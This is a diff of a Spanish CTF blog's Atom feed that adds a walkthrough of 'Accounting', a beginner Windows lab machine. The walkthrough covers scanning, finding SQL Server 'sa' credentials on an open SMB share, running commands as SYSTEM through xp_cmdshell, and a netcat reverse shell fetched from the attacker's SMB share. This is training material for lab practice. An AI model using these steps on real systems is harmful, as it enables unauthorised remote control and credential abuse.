@@ -1,4 +1,287 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-07-01T09:27:13+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">DebugSec</title><link href="/posts/debugsec/" rel="alternate" type="text/html" title="DebugSec" /><published>2024-06-29T00:00:00+00:00</published><updated>2024-06-29T00:00:00+00:00</updated><id>/posts/debugsec</id><content type="html" xml:base="/posts/debugsec/"><![CDATA[<p><img src="/assets/images/debugsec/1.jpg" alt="image" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-07-01T09:32:20+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">accounting</title><link href="/posts/accounting/" rel="alternate" type="text/html" title="accounting" /><published>2024-07-01T00:00:00+00:00</published><updated>2024-07-01T00:00:00+00:00</updated><id>/posts/accounting</id><content type="html" xml:base="/posts/accounting/"><![CDATA[<p><img src="/assets/images/accounting/acc.jpg" alt="image" /></p>
+
+<p>Estamos ante una máquina Windows de nivel principiante creada por Wxrdcn de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
+Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
+Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+10.0.2.1        52:54:00:12:35:00       QEMU
+10.0.2.2        52:54:00:12:35:00       QEMU
+10.0.2.3        08:00:27:63:af:94       PCS Systemtechnik GmbH
+10.0.2.145      08:00:27:b0:1c:c9       PCS Systemtechnik GmbH
+</code></pre></div></div>
+
+<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.145</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> y que nos guarde a un fichero grepeable <code class="language-plaintext highlighter-rouge">-oG</code> con nombre <code class="language-plaintext highlighter-rouge">ports.txt</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.145</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.145 <span class="nt">-oG</span> ports.txt
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+1801/tcp  open  msmq
+2103/tcp  open  zephyr-clt
+2105/tcp  open  eklogin
+2107/tcp  open  msmq-mgmt
+5040/tcp  open  unknown
+5357/tcp  open  wsdapi
+7680/tcp  open  pando-pub
+9047/tcp  open  unknown
+9079/tcp  open  unknown
+9080/tcp  open  glrpc
+9081/tcp  open  cisco-aqos
+9083/tcp  open  emc-pp-mgmtsvc
+9147/tcp  open  unknown
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49672/tcp open  unknown
+49702/tcp open  unknown
+49992/tcp open  unknown
+</code></pre></div></div>
+
+<p>Como tiene un montón de puertos abiertos obtenemos la lista con el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>ports.txt | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span>
+135,139,445,1801,2103,2105,2107,5040,5357,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49669,49670,49672,49702,49992
+</code></pre></div></div>
+
+<p>Ahora hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p135</span>,139,445,1801,2103,2105,2107,5040,5357,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49669,49670,49672,49702,49992 <span class="nt">-v</span> 10.0.2.145
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+1801/tcp  open  msmq?
+2103/tcp  open  msrpc         Microsoft Windows RPC
+2105/tcp  open  msrpc         Microsoft Windows RPC
+2107/tcp  open  msrpc         Microsoft Windows RPC
+5040/tcp  open  unknown
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Service Unavailable
+|_http-server-header: Microsoft-HTTPAPI/2.0
+7680/tcp  open  pando-pub?
+9047/tcp  open  unknown
+9079/tcp  open  unknown
+9080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9081/tcp  open  http          Microsoft Cassini httpd 4.0.1.6 <span class="o">(</span>ASP.NET 4.0.30319<span class="o">)</span>
+|_http-server-header: Cassini/4.0.1.6
+| http-title: Login Saci
+|_Requested resource was /App/Login.aspx
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+9083/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9147/tcp  open  unknown
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49702/tcp open  msrpc         Microsoft Windows RPC
+49992/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-06-30T06:56:01
+| Not valid after:  2054-06-30T06:56:01
+| MD5:   a060:b5e7:eaf0:3da6:de75:cbed:7d75:2686
+|_SHA-1: 3208:f8bb:d393:2af9:05df:76b3:afa8:a688:f62f:30cb
+|_ssl-date: 2024-06-30T17:30:37+00:00<span class="p">;</span> +26s from scanner time.
+| ms-sql-info: 
+|   10.0.2.145<span class="se">\C</span>OMPAC: 
+|     Instance name: COMPAC
+|     Version: 
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: <span class="nb">false</span>
+|     TCP port: 49992
+|_    Clustered: <span class="nb">false</span>
+| ms-sql-ntlm-info: 
+|   10.0.2.145<span class="se">\C</span>OMPAC: 
+|     Target_Name: DESKTOP-M464J3M
+|     NetBIOS_Domain_Name: DESKTOP-M464J3M
+|     NetBIOS_Computer_Name: DESKTOP-M464J3M
+|     DNS_Domain_Name: DESKTOP-M464J3M
+|     DNS_Computer_Name: DESKTOP-M464J3M
+|_    Product_Version: 10.0.19041
+MAC Address: 08:00:27:B0:1C:C9 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| nbstat: NetBIOS name: DESKTOP-M464J3M, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:b0:1c:c9 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+| Names:
+|   DESKTOP-M464J3M&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   DESKTOP-M464J3M&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|_  <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2024-06-30T17:29:55
+|_  start_date: N/A
+|_clock-skew: mean: 26s, deviation: 0s, median: 25s
+</code></pre></div></div>
+
+<p>Encontramos una web en el puerto <code class="language-plaintext highlighter-rouge">9081</code>, vemos que tecnología usa con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">-a</span> 3 http://10.0.2.145:9081
+http://10.0.2.145:9081 <span class="o">[</span>302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Cassini/4.0.1.6], IP[10.0.2.145], RedirectLocation[/App/Login.aspx], Title[Object moved]                                                                                                                                                         
+http://10.0.2.145:9081/App/Login.aspx <span class="o">[</span>200 OK] ASP_NET[4.0.30319], Bootstrap, Cookies[ASP.NET_SessionId], Country[RESERVED][ZZ], HTML5, HTTPServer[Cassini/4.0.1.6], HttpOnly[ASP.NET_SessionId], IP[10.0.2.145], JQuery[3.7.0], PasswordField[txtPassword], Script[text/javascript], Title[Login Saci]
+</code></pre></div></div>
+
+<p>Realizamos una búsqueda de ficheros y directorios con <code class="language-plaintext highlighter-rouge">feroxbuster</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://10.0.2.145:9081 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> aspx <span class="nt">-r</span> <span class="nt">-d</span> 2
+...
+200      GET        2l        2w       22c http://10.0.2.145:9081/download/notas.txt
+...
+
+</code></pre></div></div>
+
+<p>Encontramos un fichero llamado <code class="language-plaintext highlighter-rouge">notas.txt</code>, lo descargamos y leemos lo que tiene:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.0.2.145:9081/download/notas.txt
+supervisor
+supervisor
+</code></pre></div></div>
+
+<p>Parece que son las credenciales para acceder a la web. Nos logeamos con éxito pero no conseguimos hacer nada para ganar la intrusión. Asi que miramos a ver que hay en el servicio <code class="language-plaintext highlighter-rouge">samba</code>. Ejecutamos <code class="language-plaintext highlighter-rouge">smbclient</code> con los parámetros <code class="language-plaintext highlighter-rouge">—-no-pass</code> para no usar credenciales, <code class="language-plaintext highlighter-rouge">-L</code> para hacer un listado de unidades y el target <code class="language-plaintext highlighter-rouge">//10.0.2.145</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">--no-pass</span> <span class="nt">-L</span> //10.0.2.145
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>         Disk      Admin remota
+        C<span class="nv">$ </span>             Disk      Recurso predeterminado
+        Compac          Disk      
+        IPC<span class="nv">$ </span>           IPC       IPC remota
+        Users           Disk
+</code></pre></div></div>
+
+<p>Vemos 2 recursos compartidos interesantes <code class="language-plaintext highlighter-rouge">Compac</code> y <code class="language-plaintext highlighter-rouge">Users</code>. Nos conectamos al recurso <code class="language-plaintext highlighter-rouge">Compac</code> y listamos los directorios:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">--no-pass</span> //10.0.2.145/Compac
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Sat May 11 04:49:15 2024
+  ..                                  D        0  Sat May 11 04:49:15 2024
+  Empresas                            D        0  Sat May 11 04:49:15 2024
+  Index                               D        0  Sun Jun 30 23:52:48 2024
+</code></pre></div></div>
+
+<p>Haciendo un listado de <code class="language-plaintext highlighter-rouge">Empresas</code> vemos un fichero que llama la atención <code class="language-plaintext highlighter-rouge">SQL.txt</code>, lo descargamos a nuestra máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\E</span>mpresas<span class="se">\&gt;</span> get SQL.txt 
+getting file <span class="se">\E</span>mpresas<span class="se">\S</span>QL.txt of size 448 as SQL.txt <span class="o">(</span>5.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 5.3 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Lo abrimos y vemos unas posibles credenciales de acceso al servicio de <code class="language-plaintext highlighter-rouge">SQL Server</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>SQL.txt 
+SQL 2017 
+Instancia COMPAC 
+sa 
+Contpaqi2023.
+
+</code></pre></div></div>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Vamos a usar el cliente de sql que trae el paquete <code class="language-plaintext highlighter-rouge">impacket</code>. Usamos <code class="language-plaintext highlighter-rouge">impacket-mssqlclient</code> con los parámetros <code class="language-plaintext highlighter-rouge">COMPAC/</code> , que es el nombre de dominio que hemos visto en el escaneo, seguido de las credenciales <code class="language-plaintext highlighter-rouge">sa:Contpaqi2023.</code> , le indicamos el target <code class="language-plaintext highlighter-rouge">@10.0.2.145</code> y el puerto, ya que no está en el puerto por defecto, <code class="language-plaintext highlighter-rouge">-port 49992</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-mssqlclient COMPAC/sa:Contpaqi2023.@10.0.2.145 <span class="nt">-port</span> 49992
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DESKTOP-M464J3M<span class="se">\C</span>OMPAC<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DESKTOP-M464J3M<span class="se">\C</span>OMPAC<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span> 
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span>
+</code></pre></div></div>
+
+<p>En SQL Server hay un comando que sirve para ejecutar comandos por una shell, <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>. Asi que una vez conectados probamos a ver si funciona el comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="nb">whoami
+</span>output                
+<span class="nt">-------------------</span>   
+nt authority<span class="se">\s</span>ystem   
+
+NULL
+</code></pre></div></div>
+
+<p>Vemos que si y encima está ejecutando los comandos como <strong>nt authority\system.</strong></p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Vamos a preparar la obtención de una shell remota como <strong>nt authority\system</strong>. Para ello nos copiamos el binario <code class="language-plaintext highlighter-rouge">nc.exe</code> a nuestro directorio de trabajo. También ponemos el servidor samba con <code class="language-plaintext highlighter-rouge">impacket-smbserver</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> /usr/share/windows-binaries/nc.exe <span class="nb">.</span>
+
+<span class="nv">$ </span>impacket-smbserver <span class="nt">-smb2support</span> murrusko <span class="nb">.</span>
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<p>Nos ponemos a la escucha en nuestra máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
+listening on <span class="o">[</span>any] 8888 ...
+</code></pre></div></div>
+
+<p>Y ejecutamos el comando para obtener la shell reversa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="se">\\</span>10.0.2.5<span class="se">\m</span>urrusko<span class="se">\n</span>c.exe 10.0.2.5 8888 <span class="nt">-e</span> cmd
+</code></pre></div></div>
+
+<p>Conseguimos la shell y vemos que realmente estamos con <strong>nt authority\system</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
+listening on <span class="o">[</span>any] 8888 ...
+connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.145] 49246
+Microsoft Windows <span class="o">[</span>Versi?n 10.0.19045.2965]
+<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. Todos los derechos reservados.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami  
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Ahora solo queda obtener las flags, pero antes solo queda un reto, obtener la flag de root… Os lo dejo a vosotros, como pista buscar <strong>ADS data streams</strong></p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="principiante" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">DebugSec</title><link href="/posts/debugsec/" rel="alternate" type="text/html" title="DebugSec" /><published>2024-06-29T00:00:00+00:00</published><updated>2024-06-29T00:00:00+00:00</updated><id>/posts/debugsec</id><content type="html" xml:base="/posts/debugsec/"><![CDATA[<p><img src="/assets/images/debugsec/1.jpg" alt="image" /></p>
 
 <p>Estamos ante una máquina Linux de nivel avanzado creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
 
@@ -1787,287 +2070,4 @@ Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corpo
 C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
 <span class="nb">whoami
 </span>nt authority<span class="se">\s</span>ystem
-</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="principiante" /><summary type="html"><![CDATA[Estamos ante una máquina Windows de nivel principiante creada por CuriosidadesDeHackers y condor de la plataforma The Hackers Labs.]]></summary></entry><entry><title type="html">Accounting</title><link href="/posts/accounting/" rel="alternate" type="text/html" title="Accounting" /><published>2024-06-21T00:00:00+00:00</published><updated>2024-06-21T00:00:00+00:00</updated><id>/posts/accounting</id><content type="html" xml:base="/posts/accounting/"><![CDATA[<p><img src="/assets/images/accounting/acc.jpg" alt="image" /></p>
-
-<p>Estamos ante una máquina Windows de nivel principiante creada por Wxrdcn de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
-
-<h1 id="enumeración">Enumeración</h1>
-
-<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
-<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
-Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
-Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
-10.0.2.1        52:54:00:12:35:00       QEMU
-10.0.2.2        52:54:00:12:35:00       QEMU
-10.0.2.3        08:00:27:63:af:94       PCS Systemtechnik GmbH
-10.0.2.145      08:00:27:b0:1c:c9       PCS Systemtechnik GmbH
-</code></pre></div></div>
-
-<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.145</code>.</p>
-
-<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> y que nos guarde a un fichero grepeable <code class="language-plaintext highlighter-rouge">-oG</code> con nombre <code class="language-plaintext highlighter-rouge">ports.txt</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.145</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.145 <span class="nt">-oG</span> ports.txt
-PORT      STATE SERVICE
-135/tcp   open  msrpc
-139/tcp   open  netbios-ssn
-445/tcp   open  microsoft-ds
-1801/tcp  open  msmq
-2103/tcp  open  zephyr-clt
-2105/tcp  open  eklogin
-2107/tcp  open  msmq-mgmt
-5040/tcp  open  unknown
-5357/tcp  open  wsdapi
-7680/tcp  open  pando-pub
-9047/tcp  open  unknown
-9079/tcp  open  unknown
-9080/tcp  open  glrpc
-9081/tcp  open  cisco-aqos
-9083/tcp  open  emc-pp-mgmtsvc
-9147/tcp  open  unknown
-49664/tcp open  unknown
-49665/tcp open  unknown
-49666/tcp open  unknown
-49667/tcp open  unknown
-49669/tcp open  unknown
-49670/tcp open  unknown
-49672/tcp open  unknown
-49702/tcp open  unknown
-49992/tcp open  unknown
-</code></pre></div></div>
-
-<p>Como tiene un montón de puertos abiertos obtenemos la lista con el siguiente comando:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>ports.txt | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span>
-135,139,445,1801,2103,2105,2107,5040,5357,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49669,49670,49672,49702,49992
-</code></pre></div></div>
-
-<p>Ahora hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p135</span>,139,445,1801,2103,2105,2107,5040,5357,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49669,49670,49672,49702,49992 <span class="nt">-v</span> 10.0.2.145
-PORT      STATE SERVICE       VERSION
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds?
-1801/tcp  open  msmq?
-2103/tcp  open  msrpc         Microsoft Windows RPC
-2105/tcp  open  msrpc         Microsoft Windows RPC
-2107/tcp  open  msrpc         Microsoft Windows RPC
-5040/tcp  open  unknown
-5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-title: Service Unavailable
-|_http-server-header: Microsoft-HTTPAPI/2.0
-7680/tcp  open  pando-pub?
-9047/tcp  open  unknown
-9079/tcp  open  unknown
-9080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-9081/tcp  open  http          Microsoft Cassini httpd 4.0.1.6 <span class="o">(</span>ASP.NET 4.0.30319<span class="o">)</span>
-|_http-server-header: Cassini/4.0.1.6
-| http-title: Login Saci
-|_Requested resource was /App/Login.aspx
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-9083/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-9147/tcp  open  unknown
-49664/tcp open  msrpc         Microsoft Windows RPC
-49665/tcp open  msrpc         Microsoft Windows RPC
-49666/tcp open  msrpc         Microsoft Windows RPC
-49667/tcp open  msrpc         Microsoft Windows RPC
-49669/tcp open  msrpc         Microsoft Windows RPC
-49670/tcp open  msrpc         Microsoft Windows RPC
-49672/tcp open  msrpc         Microsoft Windows RPC
-49702/tcp open  msrpc         Microsoft Windows RPC
-49992/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
-| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
-| Issuer: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
-| Public Key <span class="nb">type</span>: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2024-06-30T06:56:01
-| Not valid after:  2054-06-30T06:56:01
-| MD5:   a060:b5e7:eaf0:3da6:de75:cbed:7d75:2686
-|_SHA-1: 3208:f8bb:d393:2af9:05df:76b3:afa8:a688:f62f:30cb
-|_ssl-date: 2024-06-30T17:30:37+00:00<span class="p">;</span> +26s from scanner time.
-| ms-sql-info: 
-|   10.0.2.145<span class="se">\C</span>OMPAC: 
-|     Instance name: COMPAC
-|     Version: 
-|       name: Microsoft SQL Server 2017 RTM
-|       number: 14.00.1000.00
-|       Product: Microsoft SQL Server 2017
-|       Service pack level: RTM
-|       Post-SP patches applied: <span class="nb">false</span>
-|     TCP port: 49992
-|_    Clustered: <span class="nb">false</span>
-| ms-sql-ntlm-info: 
